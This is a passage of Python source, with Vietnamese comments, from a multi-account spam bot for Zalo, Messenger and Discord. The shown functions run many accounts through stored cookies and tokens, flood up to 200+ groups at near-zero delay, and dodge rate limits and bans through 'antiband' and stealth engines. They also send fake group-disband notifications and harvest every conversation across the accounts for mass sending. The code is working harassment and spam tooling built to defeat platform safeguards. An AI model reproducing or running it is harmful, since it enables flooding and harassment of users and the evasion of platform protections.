                        b_num = parts_b[1] if len(parts_b) > 1 else "9999999999"
                        b_name = parts_b[2] if len(parts_b) > 2 else "ACCOUNT VIP"
                        client.send_card_bank(t_id, bin_bank=b_bin, num_acc=b_num, name_acc=b_name, is_group=is_grp)
                    elif mode == "share_contact":
                        c_uid = tag_users[0]["uid"] if tag_users else client.uid
                        client.send_business_card(t_id, target_uid=c_uid, is_group=is_grp)
                    elif mode == "zalo_gif":
                        client.send_gif_or_sticker(
                            t_id, text_msg=pkt_text, is_group=is_grp,
                            mentions=(tag_users if is_grp else None),
                            tag_all=(tag_all if is_grp else False),
                            color_mode=color_mode or "word_rainbow", fixed_color=fixed_color
                        )
                    elif mode == "nhay_giaitan":
                        client.spam_group_disband_notification(t_id, group_name=pkt_text or "Lũ vdanh", send_inbox_alert=False)
                    elif mode == "treo_sticker":
                        client.send_native_sticker(t_id, keyword=pkt_text, is_group=is_grp)
                    else:
                        client.send_adv(
                            pkt_text, t_id, color_mode=color_mode, fixed_color=fixed_color,
                            is_group=is_grp, mentions=(tag_users if is_grp else None),
                            tag_all=(tag_all if is_grp else False), is_heading=is_heading,
                            color_offset=color_counter, antiband=antiband,
                            use_emoji=eff_em, icon_count=eff_ic,
                            auto_retry_thread_type=True, strip_line_num=s_num_flag,
                            hide_tag_all=bool(runtime_opts.get("hide_tag_all", True)),
                            hide_tag_name=bool(runtime_opts.get("hide_tag_name", True)),
                            font_style=f_style
                        )
                elif plat == "messenger":
                    client.send_message(
                        t_id, pkt_text, is_group=True, mentions=tag_users,
                        tag_all=tag_all, antiband=antiband,
                        use_emoji=eff_em, icon_count=eff_ic,
                        is_heading=is_heading, strip_line_num=s_num_flag,
                        stop_ev=stop_ev, start_global_epoch=start_global_epoch, start_box_epoch=box_epochs.get(t_id)
                    )
                else:
                    msg_ln = (pkt_text + " " + build_unique_zalo_icons(eff_ic)) if (eff_em and eff_ic > 0) else pkt_text
                    sent_res = client.send_message(
                        t_id, msg_ln, color_mode=color_mode,
                        fixed_color=fixed_color, antiband=antiband,
                        mentions=tag_users, tag_all=tag_all,
                        strip_line_num=s_num_flag, is_heading=is_heading,
                        stop_ev=stop_ev, start_global_epoch=start_global_epoch, start_box_epoch=box_epochs.get(t_id)
                    )
                    if sent_res is None:
                        continue
                target_b_idx[t_id] = cur_idx + step_inc
                lat_ms = (time.perf_counter() - t0_s) * 1000.0
                with lock:
                    counter["sent"] += 1
                if wave_key:
                    WaveFairnessEngine.record_acc_sent(wave_key, acc_id)
                HEALTH_MGR.report_success(acc_id, latency_ms=lat_ms, channel_id=t_id)
                color_counter += 1
                fired_in_pass += 1
            except Exception as ex_s:
                err_s = str(ex_s)
                if "ChannelForbidden:" in err_s:
                    dead_targets.add(t_id)
                    continue
                if "ChannelForbidden:" in err_s:
                    dead_targets.add(t_id)
                elif "429:RateLimit:" in err_s:
                    parts = err_s.split(":")
                    try:
                        ra = float(parts[2])
                    except Exception:
                        ra = 0.3
                    # Đánh dấu lướt nhẹ riêng nhóm này để luồng bắn ngay sang nhóm kế tiếp trong 0ms (không dừng!)
                    target_skip_until[t_id] = time.time() + min(0.28, max(0.04, ra * 0.25))
                    HEALTH_MGR.report_rate_limit(acc_id, ra, reason=err_s, channel_id=t_id)
                elif "AuthError" in err_s:
                    HEALTH_MGR.report_error(acc_id, err_s, is_auth_error=True)
                    target_skip_until[t_id] = time.time() + 1.0
                else:
                    target_skip_until[t_id] = time.time() + 0.15
                    HEALTH_MGR.report_error(acc_id, err_s, is_auth_error=False, channel_id=t_id)

        if delay > 0.0:
            if interruptible_wait(stop_ev, delay, start_global_epoch, None, None):
                break
        elif fired_in_pass == 0:
            # Nếu toàn bộ nhóm trong shard đang chờ vi nhịp hết 0.04s thì nhường CPU 0.015s rồi bắn tiếp ngay
            if interruptible_wait(stop_ev, 0.015, start_global_epoch, None, None):
                break


def single_acc_multi_box_dispatcher(acc_dict, targets, blocks, runtime_opts, stop_ev, counter, lock, acc_idx=0):
    acc_id = acc_dict["id"]
    plat = (acc_dict.get("platform") or "zalo").lower()
    raw_acc_name = acc_dict.get("name") or f"Acc #{acc_id}"
    acc_key = f"{raw_acc_name} (#{acc_id})"

    my_targets = []
    for t in targets:
        t_type = t.get("type", "group")
        if plat == "discord" and t_type != "discord_channel":
            continue
        if plat == "messenger" and t_type not in ("messenger_thread", "messenger_group", "messenger_user"):
            continue
        if plat == "zalo" and t_type in ("discord_channel", "messenger_thread", "messenger_group", "messenger_user"):
            continue
        if t.get("strict_bind"):
            assigned = t.get("assigned_acc_ids") or t.get("acc_ids")
            if assigned and isinstance(assigned, (list, tuple, set)):
                clean_a = {int(x) for x in assigned if str(x).isdigit()}
                if clean_a and int(acc_id) not in clean_a:
                    continue
        my_targets.append(t)

    if not my_targets:
        return

    client = None
    if plat == "zalo":
        try:
            client = Zalo.get_pooled_client(
                acc_dict["imei"], acc_dict["cookies"],
                user_agent=acc_dict.get("user_agent") or "",
                zpw_enk_hint=acc_dict.get("zpw_enk") or "",
                uid_hint=acc_dict.get("uid") or ""
            )
            HEALTH_MGR.report_success(acc_id)
        except Exception as e:
            HEALTH_MGR.report_error(acc_id, str(e), is_auth_error=True)
            return
    elif plat == "messenger":
        try:
            client = MessengerClient.get_pooled_client(acc_dict["cookies"], uid=acc_dict.get("uid") or "")
            HEALTH_MGR.report_success(acc_id)
        except Exception as e:
            HEALTH_MGR.report_error(acc_id, str(e), is_auth_error=True)
            return
    else:
        try:
            client = DiscordClient(acc_dict["token"], is_bot=bool(acc_dict.get("is_bot", 0)))
            off_uid = decode_discord_uid_offline(client.token)
            if off_uid:
                client.user_id = off_uid
            elif not client.check(force_network=False):
                raise Exception("Token Discord không hợp lệ hoặc đã hết hạn")
            HEALTH_MGR.report_success(acc_id)
        except Exception as e:
            HEALTH_MGR.report_error(acc_id, str(e), is_auth_error=True)
            return

    with lock:
        if "by_acc" not in counter:
            counter["by_acc"] = {}
        counter["by_acc"][acc_key] = counter["by_acc"].get(acc_key, 0)

    class _AccCounterProxy(dict):
        def __getitem__(self, k):
            return counter.get(k, 0)
        def __setitem__(self, k, v):
            diff = v - counter.get(k, 0)
            counter[k] = v
            if k == "sent" and diff > 0:
                counter["by_acc"][acc_key] = counter["by_acc"].get(acc_key, 0) + diff

    proxy_counter = _AccCounterProxy()
    box_threads = []
    total_boxes = max(1, len(my_targets))
    cur_d_cfg = float(runtime_opts.get("delay", 0.0) or 0.0)
    stagger_base = 0.0

    # Tối ưu Đa Acc Siêu Mượt Không Lag: Mỗi Acc phân bổ đúng 1 luồng độc lập cho mỗi Box mục tiêu
    # (Loại bỏ việc nhân 3 luồng trùng lặp trên cùng 1 Box gây nghẽn GIL & làm lag khi treo nhiều Acc cùng lúc!)
    expanded_targets = list(my_targets)

    max_shards_per_acc = (200 if len(expanded_targets) > 200 else len(expanded_targets)) if cur_d_cfg <= 0.0 else (96 if len(expanded_targets) > 96 else len(expanded_targets))
    rotated_targets = list(expanded_targets)
    if len(rotated_targets) > 1 and acc_idx > 0:
        rot_offset = (acc_idx * 3) % len(rotated_targets)
        rotated_targets = rotated_targets[rot_offset:] + rotated_targets[:rot_offset]

    shards = [[] for _ in range(max(1, max_shards_per_acc))]
    for idx_t, t_item in enumerate(rotated_targets):
        shards[idx_t % len(shards)].append(t_item)

    for shard_list in shards:
        if not shard_list:
            continue
        bt = threading.Thread(
            target=multi_box_shard_worker,
            args=(client, acc_id, plat, shard_list, blocks, runtime_opts, stop_ev, proxy_counter, lock, stagger_base, total_boxes),
            daemon=True
        )
        box_threads.append(bt)
        bt.start()

    while not stop_ev.is_set():
        if not any(bt.is_alive() for bt in box_threads):
            break
        stop_ev.wait(0.25)

    for bt in box_threads:
        bt.join(timeout=0.02)

def task_supervisor(tid, targets, blocks, runtime_opts, multi_acc, stop_ev, specific_acc_id=None, account_ids=None):
    all_enabled = get_all_accounts_from_ram(enabled_only=True)
    if account_ids and isinstance(account_ids, (list, tuple, set)):
        id_set = {int(x) for x in account_ids if str(x).isdigit()}
        accs = [a for a in all_enabled if int(a["id"]) in id_set]
        if not accs:
            accs = all_enabled
    elif specific_acc_id and not multi_acc:
        acc_single = get_account_from_ram(specific_acc_id)
        accs = [acc_single] if acc_single else []
    elif specific_acc_id and multi_acc:
        acc_single = get_account_from_ram(specific_acc_id)
        plat_Filter = (acc_single.get("platform") or "zalo") if acc_single else None
        accs = get_all_accounts_from_ram(platform=plat_Filter, enabled_only=True)
        if not accs and acc_single:
            accs = [acc_single]
    else:
        accs = all_enabled

    if not accs:
        with TASKS_RAM_LOCK:
            if tid in TASKS_RAM_STORE:
                TASKS_RAM_STORE[tid]["status"] = "stopped"
        ACTIVE_TASKS.pop(tid, None)
        return

    # Hỗ trợ tới 100+ tài khoản chạy đồng thời song song & đăng ký Bộ Điều Phối Luồng Sóng Đều (WaveFairnessEngine)
    selected_accs = accs[:120] if multi_acc else [accs[0]]
    runtime_opts["_wave_key"] = tid
    WaveFairnessEngine.register_accounts_for_wave(tid, [a["id"] for a in selected_accs])
    acc_names_list = [f"{a.get('name') or 'Acc'} (#{a['id']})" for a in selected_accs]
    with TASKS_RAM_LOCK:
        if tid in TASKS_RAM_STORE:
            TASKS_RAM_STORE[tid]["acc_count"] = len(selected_accs)
            TASKS_RAM_STORE[tid]["acc_names"] = acc_names_list

    counter = {"sent": 0, "by_acc": {n: 0 for n in acc_names_list}}
    lock = threading.Lock()
    threads = []

    for idx_a, a in enumerate(selected_accs):
        a_blocks = list(blocks)
        if idx_a > 0 and len(a_blocks) > 1:
            sh = idx_a % len(a_blocks)
            a_blocks = a_blocks[sh:] + a_blocks[:sh]
        t = threading.Thread(
            target=single_acc_multi_box_dispatcher,
            args=(dict(a), targets, a_blocks, runtime_opts, stop_ev, counter, lock, idx_a),
            daemon=True
        )
        threads.append(t)
        t.start()
        if idx_a < len(selected_accs) - 1 and len(selected_accs) > 1:
            time.sleep(min(0.08, 0.40 / max(1, len(selected_accs))))

    while not stop_ev.is_set():
        alive = any(t.is_alive() for t in threads)
        if not alive:
            break
        with TASKS_RAM_LOCK:
            if tid in TASKS_RAM_STORE:
                TASKS_RAM_STORE[tid]["sent"] = counter["sent"]
                TASKS_RAM_STORE[tid]["by_acc"] = dict(counter.get("by_acc") or {})
        if stop_ev.wait(0.30):
            break

    with TASKS_RAM_LOCK:
        if tid in TASKS_RAM_STORE:
            TASKS_RAM_STORE[tid]["sent"] = counter["sent"]
            TASKS_RAM_STORE[tid]["by_acc"] = dict(counter.get("by_acc") or {})
            TASKS_RAM_STORE[tid]["status"] = "stopped"
            TASKS_RAM_STORE[tid]["dirty"] = True
    ACTIVE_TASKS.pop(tid, None)

def start_task_programmatic(targets, blocks, delay=0.0, use_emoji=False, icon_count=0,
                            tag_users=None, tag_all=False, is_heading=True, multi_acc=True,
                            mode="fast", color_mode="word_rainbow", fixed_color="red",
                            antiband=True, antidieall=True, specific_acc_id=None, source_label="web",
                            defer_db_insert=False, account_ids=None, trigger_cmd="", hide_tag_all=True,
                            hide_tag_name=True, font_style=None, strip_line_num=True, **extra_kwargs):
    tid = new_tid("cmd" if source_label == "chat" else "task")
    stop_ev = threading.Event()
    tag_users = tag_users or []
    norm_targets = []
    for t_raw in (targets or []):
        if isinstance(t_raw, dict):
            t_copy = dict(t_raw)
            tid_val = str(t_copy.get("id") or t_copy.get("thread_id") or "").strip()
            if tid_val:
                t_copy["id"] = tid_val
                t_copy["thread_id"] = tid_val
                t_copy.setdefault("name", f"Box {tid_val[-6:]}")
                t_copy.setdefault("type", "group")
                norm_targets.append(t_copy)
                ACTIVE_TARGET_BOXES_SET.add(tid_val)
                HOT_ACTIVE_ZALO_GROUPS.add(tid_val)
                for _aid_k in list(ACTIVE_LISTENERS.keys()) + [specific_acc_id or 0]:
                    if _aid_k:
                        DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS[_aid_k].add(tid_val)
                        MessengerStealthAntiBanEngine.ACTIVE_MESSENGER_POLL_THREADS[_aid_k].add(tid_val)
    targets = norm_targets

    clean_blocks = []
    for b in blocks:
        if mode == "treo_nhay":
            lines_b = [strip_leading_line_number(ln) for ln in str(b).replace("\r\n", "\n").split("\n") if ln.strip()]
            clean_blocks.extend([x for x in lines_b if x])
        else:
            clean_blocks.append(clean_corrupted_shortcuts(str(b)))
    if not clean_blocks:
        clean_blocks = list(blocks)

    with SYSTEM_CFG_LOCK:
        eff_fs = font_style or SYSTEM_RUNTIME_CONFIG.get("font_style", "big_bold" if is_heading else "normal")
        if source_label == "web":
            SYSTEM_RUNTIME_CONFIG["delay"] = float(delay)
            SYSTEM_RUNTIME_CONFIG["icon_count"] = int(icon_count)
            SYSTEM_RUNTIME_CONFIG["use_emoji"] = bool(use_emoji) and (int(icon_count) > 0)
            SYSTEM_RUNTIME_CONFIG["color_mode"] = color_mode
            SYSTEM_RUNTIME_CONFIG["fixed_color"] = fixed_color
            SYSTEM_RUNTIME_CONFIG["font_style"] = eff_fs
            SYSTEM_RUNTIME_CONFIG["is_heading"] = bool(is_heading)

    runtime_opts = {
        "delay": float(delay),
        "use_emoji": bool(use_emoji) and (int(icon_count) > 0),
        "icon_count": int(icon_count) if bool(use_emoji) else 0,
        "font_style": eff_fs,
        "tag_users": list(tag_users),
        "tag_all": bool(tag_all),
        "hide_tag_all": bool(hide_tag_all),
        "hide_tag_name": bool(hide_tag_name),
        "is_heading": bool(is_heading),
        "mode": mode,
        "color_mode": color_mode,
        "fixed_color": fixed_color,
        "antiband": bool(antiband),
        "antidieall": bool(antidieall),
        "strip_line_num": (mode == "treo_nhay") or True,
    }

    meta_info = {
        "source": source_label,
        "trigger_cmd": trigger_cmd or ("Lệnh khung chat" if source_label == "chat" else "Khởi chạy từ Web"),
        "multi_acc": multi_acc,
        "account_ids": list(account_ids) if account_ids else [],
        "color_mode": color_mode,
        "delay": delay,
        "targets": [str(t.get("id")) for t in targets],
        "target_names": [t.get("name", str(t.get("id"))) for t in targets],
        "box_count": len(targets),
        "tag_count": len(tag_users),
        "tag_all": tag_all
    }

    now_ts = time.time()
    with TASKS_RAM_LOCK:
        TASKS_RAM_STORE[tid] = {
            "id": tid,
            "type": mode,
            "meta": meta_info,
            "status": "running",
            "started_at": now_ts,
            "sent": 0,
            "fail": 0,
            "delay": float(delay),
            "acc_count": 1,
            "acc_names": [],
            "by_acc": {},
            "dirty": True,
            "persisted": False,
        }

    th = threading.Thread(
        target=task_supervisor,
        args=(tid, targets, clean_blocks, runtime_opts, multi_acc, stop_ev, specific_acc_id, account_ids),
        daemon=True
    )

    ACTIVE_TASKS[tid] = {
        "stop": stop_ev,
        "thread": th,
        "targets": [str(t.get("id")) for t in targets],
        "opts": runtime_opts,
        "acc_id": specific_acc_id,
        "source": source_label
    }
    th.start()
    try:
        with _STATUS_CACHE_LOCK:
            _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    except Exception:
        pass
    return tid

def update_running_tasks_config(thread_id=None, **kwargs):
    """Cập nhật tức thì cấu hình hệ thống (SYSTEM_RUNTIME_CONFIG) và áp dụng đồng bộ lên MỌI nhóm đang chạy + giao diện Web!"""
    updated = 0
    with SYSTEM_CFG_LOCK:
        for k, v in kwargs.items():
            if k in SYSTEM_RUNTIME_CONFIG:
                SYSTEM_RUNTIME_CONFIG[k] = v

    try:
        DiscordClient._DISCORD_MSG_FORMAT_CACHE.clear()
    except Exception:
        pass
    try:
        Zalo._ZALO_ADV_FORMAT_CACHE.clear()
    except Exception:
        pass

    for tid, info in list(ACTIVE_TASKS.items()):
        if thread_id is None or str(thread_id) in info.get("targets", []):
            opts = info.get("opts")
            if isinstance(opts, dict):
                opts.update(kwargs)
                updated += 1
            if "delay" in kwargs:
                with TASKS_RAM_LOCK:
                    if tid in TASKS_RAM_STORE:
                        TASKS_RAM_STORE[tid]["delay"] = float(kwargs["delay"])
    try:
        with _STATUS_CACHE_LOCK:
            _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    except Exception:
        pass
    return updated

_RECENT_STOPPED_COUNT_CACHE = {}
_RECENT_STOPPED_LOCK = threading.RLock()


def stop_tasks_for_thread(thread_id=None, acc_id=None):
    """Công tắc Ngắt Thông Minh Từng Cookie & Từng Box (.stop / .t) vs Ngắt Toàn Bộ (.stopall / .ta) 0ms:
    - Khi truyền `acc_id` (lệnh gõ từ 1 Cookie trong chat): CHỈ ngắt tiến trình của đúng Cookie `acc_id` đó
      ("cookie nào thì cookie ấy tự sài, không chồng chéo"), giữ nguyên tiến trình của các Cookie khác!
    - Khi `acc_id=None` (bấm từ Web Dashboard / Telegram): Ngắt toàn bộ theo `thread_id` hoặc toàn hệ thống."""
    cache_k = f"{acc_id or 'ALL'}:{'__ALL__' if thread_id is None else str(thread_id).strip()}"

    def _task_matches_acc(info_d, tid_k):
        if acc_id is None:
            return True
        if info_d.get("acc_id") == acc_id:
            return True
        with TASKS_RAM_LOCK:
            t_o = TASKS_RAM_STORE.get(tid_k) or {}
            a_ids = (t_o.get("meta") or {}).get("account_ids") or []
            if acc_id in a_ids and len(a_ids) == 1:
                return True
        return False

    if thread_id is None:
        if acc_id is None:
            bump_stop_epoch(None)
            DiscordStealthAntiBanEngine.abort_all_campaign_wait_buckets(None)
            with AUTO_INTERCEPT_LOCK:
                AUTO_INTERCEPT_BOXES.clear()
        stopped = 0
        stopped_tids = []
        for tid, info in list(ACTIVE_TASKS.items()):
            if _task_matches_acc(info, tid):
                info["stop"].set()
                stopped_tids.append(tid)
                stopped += 1
        for tid in stopped_tids:
            ACTIVE_TASKS.pop(tid, None)
        with TASKS_RAM_LOCK:
            for tid_k, t_obj in TASKS_RAM_STORE.items():
                if t_obj.get("status") == "running" and (acc_id is None or tid_k in stopped_tids):
                    t_obj["status"] = "stopped"
                    t_obj["dirty"] = True
                    stopped = max(stopped, 1)
    else:
        tid_s = str(thread_id).strip()
        if acc_id is None:
            bump_stop_epoch(tid_s)
            DiscordStealthAntiBanEngine.abort_all_campaign_wait_buckets(tid_s)
        with AUTO_INTERCEPT_LOCK:
            AUTO_INTERCEPT_BOXES.pop(tid_s, None)
        stopped = 0
        stopped_tids = []
        for tid, info in list(ACTIVE_TASKS.items()):
            if not _task_matches_acc(info, tid):
                continue
            t_list = [str(x).strip() for x in (info.get("targets") or [])]
            if tid_s in t_list:
                rem_targets = [x for x in t_list if x != tid_s]
                info["targets"] = rem_targets
                stopped += 1
                if not rem_targets:
                    info["stop"].set()
                    stopped_tids.append(tid)
        for tid in stopped_tids:
            ACTIVE_TASKS.pop(tid, None)
        with TASKS_RAM_LOCK:
            for tid in stopped_tids:
                if tid in TASKS_RAM_STORE:
                    TASKS_RAM_STORE[tid]["status"] = "stopped"
                    TASKS_RAM_STORE[tid]["dirty"] = True
            for tid, t_obj in TASKS_RAM_STORE.items():
                if t_obj.get("status") == "running" and isinstance(t_obj.get("meta"), dict):
                    if acc_id is not None and tid not in stopped_tids:
                        a_ids = t_obj["meta"].get("account_ids") or []
                        if a_ids and acc_id not in a_ids:
                            continue
                    m_targets = [str(x).strip() for x in (t_obj["meta"].get("targets") or [])]
                    if tid_s in m_targets:
                        t_obj["meta"]["targets"] = [x for x in m_targets if x != tid_s]
                        t_obj["meta"]["box_count"] = len(t_obj["meta"]["targets"])
                        t_obj["dirty"] = True

    def _async_stop_db():
        try:
            conn = db()
            if thread_id is None:
                conn.execute("UPDATE tasks SET status='stopped' WHERE status='running'")
            elif stopped_tids:
                conn.executemany("UPDATE tasks SET status='stopped' WHERE id=?", [(t,) for t in stopped_tids])
            conn.commit()
        except Exception:
            pass

    now_st = time.time()
    with _RECENT_STOPPED_LOCK:
        if stopped > 0:
            _RECENT_STOPPED_COUNT_CACHE[cache_k] = (now_st, stopped)
        else:
            prev_ent = _RECENT_STOPPED_COUNT_CACHE.get(cache_k)
            if prev_ent and (now_st - prev_ent[0] < 2.5):
                stopped = prev_ent[1]
    threading.Thread(target=_async_stop_db, daemon=True).start()
    try:
        with _STATUS_CACHE_LOCK:
            _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    except Exception:
        pass
    return stopped

def log_system_command(acc_id, thread_id, sender_id, cmd_text, action_taken, sender_name=""):
    acc_obj = get_account_from_ram(acc_id) if acc_id else None
    acc_name = (acc_obj.get("name") if acc_obj else "") or (f"Acc #{acc_id}" if acc_id else "Web Admin")
    plat_lbl = ((acc_obj.get("platform") if acc_obj else "") or ("web" if not acc_id else "zalo")).upper()
    s_uid_str = str(sender_id or "").strip()
    resolved_sender_name = (
        str(sender_name or "").strip()
        or GLOBAL_USER_NAME_CACHE.get(s_uid_str)
        or (acc_name if s_uid_str in ("0", "", str((acc_obj or {}).get("uid") or "")) else f"UID_{s_uid_str[-5:]}")
    )
    now_t = time.time()
    entry = {
        "acc_id": acc_id,
        "acc_name": acc_name,
        "platform": plat_lbl,
        "time_str": time.strftime("%H:%M:%S", time.localtime(now_t)),
        "thread_id": str(thread_id or ""),
        "sender_id": s_uid_str,
        "sender_name": resolved_sender_name,
        "cmd_text": sanitize_log_text(cmd_text)[:240],
        "action_taken": sanitize_log_text(action_taken)[:240],
        "created_at": now_t,
    }
    BOT_LOGS_RAM_DEQUE.appendleft(entry)
    try:
        with _STATUS_CACHE_LOCK:
            _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    except Exception:
        pass

    def _async_log_db():
        try:
            conn = db()
            conn.execute(
                "INSERT INTO bot_logs (acc_id, thread_id, sender_id, cmd_text, action_taken, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (entry["acc_id"], mask_sensitive_id(thread_id, 6), mask_sensitive_id(sender_id, 6), entry["cmd_text"], entry["action_taken"], entry["created_at"])
            )
            conn.commit()
        except Exception:
            pass

    threading.Thread(target=_async_log_db, daemon=True).start()

def strip_invisible_chars(s):
    if not s:
        return ""
    out = []
    for ch in str(s):
        if ch in ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u00a0"):
            continue
        if unicodedata.category(ch) == "Cf":
            continue
        out.append(ch)
    return "".join(out).strip()


class FullConversationAutoScanner:
    """Bộ Soi Tự Động Full Cuộc Trò Chuyện Đa Nền Tảng (Discord • Zalo • Messenger Auto-Discovery Engine ):
    - Tự động thu hoạch và lập chỉ mục toàn bộ 200-500+ cuộc trò chuyện (Box Nhóm DM, Chat Riêng, Kênh Server, Nhóm Zalo)
      trên tất cả 50+ tài khoản đang kết nối.
    - Cho phép gõ lệnh .soi / .dsbox để xem danh sách đánh số #1 -> #200+ và gõ lệnh .g / .n / .xa kèm:
      + `allnhom` / `allbox` / `nhom=all`: Gửi đồng loạt vào TẤT CẢ các nhóm đã soi!
      + `200nhom` / `50nhom` / `nhom=200`: Gửi đồng loạt vào đúng số lượng nhóm yêu cầu!
      + `nhom=1,2,5` hoặc `nhom=1-200` hoặc `nhom=ID1,ID2`: Gửi chính xác vào các nhóm chỉ định!"""

    _LOCK = threading.RLock()
    _CACHE_BY_PLAT = {"discord": [], "zalo": [], "messenger": []}
    _LAST_SCAN_TS = {"discord": 0.0, "zalo": 0.0, "messenger": 0.0}

    @classmethod
    def register_live_conversation(cls, platform, box_id, box_name="", sub_type="channel", guild_id=""):
        plat = str(platform or "discord").lower()
        bid = str(box_id or "").strip()
        if not bid or bid == "0":
            return
        t_type = "discord_channel" if plat == "discord" else ("messenger_thread" if plat == "messenger" else "group")
        with cls._LOCK:
            cur_list = cls._CACHE_BY_PLAT.setdefault(plat, [])
            if any(str(x.get("id")) == bid for x in cur_list):
                return
            cur_list.append({
                "id": bid,
                "name": box_name or f"[{plat.upper()}] Box #{bid[-5:]}",
                "type": t_type,
                "sub_type": sub_type,
                "guild_id": str(guild_id or ""),
            })

    @classmethod
    def scan_full_conversations(cls, platform="discord", force_refresh=False):
        plat = str(platform or "discord").lower()
        now = time.time()
        with cls._LOCK:
            cached = cls._CACHE_BY_PLAT.get(plat) or []
            if not force_refresh and cached and (now - cls._LAST_SCAN_TS.get(plat, 0.0) < 180.0):
                return [dict(x, display_idx=i + 1) for i, x in enumerate(cached)]

        accs = get_all_accounts_from_ram(platform=plat, enabled_only=True)
        if not accs:
            accs = get_all_accounts_from_ram(platform=plat, enabled_only=False)

        discovered = []
        seen_ids = set()

        if plat == "discord":
            def _scan_one_dc(a_row):
                try:
                    bot = DiscordClient(a_row["token"], is_bot=bool(a_row.get("is_bot", 0)))
                    return bot.get_all_boxes(force_refresh=force_refresh)
                except Exception:
                    return []
            if accs:
                with ThreadPoolExecutor(max_workers=min(24, len(accs))) as pool:
                    for b_list in pool.map(_scan_one_dc, accs):
                        for b in (b_list or []):
                            cid = str(b.get("id") or "").strip()
                            if cid and cid not in seen_ids:
                                seen_ids.add(cid)
                                discovered.append({
                                    "id": cid,
                                    "name": b.get("name") or f"Discord Box {cid[-5:]}",
                                    "type": "discord_channel",
                                    "sub_type": b.get("sub_type", "channel"),
                                })
        elif plat == "zalo":
            def _scan_one_zl(a_row):
                out = []
                try:
                    z = Zalo.get_pooled_client(
                        a_row["imei"], a_row["cookies"],
                        user_agent=a_row.get("user_agent") or "",
                        zpw_enk_hint=a_row.get("zpw_enk") or "",
                        uid_hint=a_row.get("uid") or ""
                    )
                    out.extend(z.groups(use_cache=not force_refresh))
                except Exception:
                    pass
                return out
            if accs:
                with ThreadPoolExecutor(max_workers=min(16, len(accs))) as pool:
                    for g_list in pool.map(_scan_one_zl, accs):
                        for g in (g_list or []):
                            gid = str(g.get("id") or "").strip()
                            if gid and gid not in seen_ids:
                                seen_ids.add(gid)
                                discovered.append({
                                    "id": gid,
                                    "name": g.get("name") or f"Nhóm Zalo {gid[-6:]}",
                                    "type": "group",
                                })
        elif plat == "messenger":
            for a_row in accs:
                try:
                    mc = MessengerClient.get_pooled_client(a_row["cookies"], uid=a_row.get("uid") or "")
                    for th in mc.get_threads(use_cache=not force_refresh):
                        tid = str(th.get("id") or "").strip()
                        if tid and tid not in seen_ids:
                            seen_ids.add(tid)
                            discovered.append({
                                "id": tid,
                                "name": th.get("name") or f"Box Mess {tid[-5:]}",
                                "type": "messenger_thread",
                            })
                except Exception:
                    continue

        with cls._LOCK:
            if discovered:
                cls._CACHE_BY_PLAT[plat] = discovered
                cls._LAST_SCAN_TS[plat] = now
            else:
                discovered = list(cls._CACHE_BY_PLAT.get(plat) or [])

        return [dict(x, display_idx=i + 1) for i, x in enumerate(discovered)]

    @classmethod
    def resolve_target_groups_from_spec(cls, platform, current_thread_id, is_group_default=True, spec_mode="current", spec_val=None):
        """Giải mã danh sách nhóm mục tiêu từ lệnh chat (.g / .n / .xa):
        - spec_mode == 'current': Chỉ gửi vào nhóm hiện tại.
        - spec_mode == 'all': Gửi vào TẤT CẢ các nhóm đã soi (200+ nhóm)!
        - spec_mode == 'count': Gửi vào đúng N nhóm (VD: 50 nhóm, 200 nhóm), luôn ưu tiên nhóm hiện tại đầu tiên!
        - spec_mode == 'custom': Chọn theo dải số thứ tự (VD: 1-200), danh sách số thứ tự (1,2,3,5) hoặc danh sách ID kênh!"""
        plat = str(platform or "discord").lower()
        t_type_default = "discord_channel" if plat == "discord" else ("messenger_thread" if plat == "messenger" else ("group" if is_group_default else "user"))
        cur_id_s = str(current_thread_id or "").strip()
        base_target = {
            "id": cur_id_s,
            "name": f"{plat.capitalize()}_{cur_id_s[-5:]}" if cur_id_s else "Current_Box",
            "type": t_type_default,
        }
        if spec_mode == "current" or not spec_mode:
            return [base_target]

        all_conv = cls.scan_full_conversations(plat, force_refresh=False)
        if not all_conv:
            all_conv = cls.scan_full_conversations(plat, force_refresh=True)

        if spec_mode == "all":
            out = []
            seen = set()
            if cur_id_s and cur_id_s != "0":
                seen.add(cur_id_s)
                cur_match = next((x for x in all_conv if str(x["id"]) == cur_id_s), None)
                out.append(cur_match if cur_match else base_target)
            for c in all_conv:
                cid = str(c["id"])
                if cid not in seen:
                    seen.add(cid)
                    out.append({"id": cid, "name": c["name"], "type": c["type"]})
            return out if out else [base_target]

        if spec_mode == "count":
            limit_n = max(1, int(spec_val or 1))
            out = []
            seen = set()
            if cur_id_s and cur_id_s != "0":
                seen.add(cur_id_s)
                cur_match = next((x for x in all_conv if str(x["id"]) == cur_id_s), None)
                out.append(cur_match if cur_match else base_target)
            for c in all_conv:
                if len(out) >= limit_n:
                    break
                cid = str(c["id"])
                if cid not in seen:
                    seen.add(cid)
                    out.append({"id": cid, "name": c["name"], "type": c["type"]})
            return out if out else [base_target]

        if spec_mode == "custom" and spec_val:
            raw_spec = str(spec_val).strip()
            out = []
            seen = set()
            parts = [p.strip() for p in raw_spec.replace(";", ",").split(",") if p.strip()]
            for p in parts:
                m_range = re.match(r"^(\d+)\s*\-\s*(\d+)$", p)
                if m_range:
                    a_idx, b_idx = int(m_range.group(1)), int(m_range.group(2))
                    lo, hi = min(a_idx, b_idx), max(a_idx, b_idx)
                    for idx_c in range(lo, hi + 1):
                        if 1 <= idx_c <= len(all_conv):
                            c = all_conv[idx_c - 1]
                            cid = str(c["id"])
                            if cid not in seen:
                                seen.add(cid)
                                out.append({"id": cid, "name": c["name"], "type": c["type"]})
                elif p.isdigit():
                    num_v = int(p)
                    if 1 <= num_v <= len(all_conv) and len(p) <= 5:
                        c = all_conv[num_v - 1]
                        cid = str(c["id"])
                        if cid not in seen:
                            seen.add(cid)
                            out.append({"id": cid, "name": c["name"], "type": c["type"]})
                    elif len(p) >= 6:
                        if p not in seen:
                            seen.add(p)
                            c_match = next((x for x in all_conv if str(x["id"]) == p), None)
                            out.append(c_match if c_match else {"id": p, "name": f"Box #{p[-5:]}", "type": t_type_default})
                else:
                    p_low = remove_vn_accents(p)
                    for c in all_conv:
                        if p_low in remove_vn_accents(c.get("name", "")):
                            cid = str(c["id"])
                            if cid not in seen:
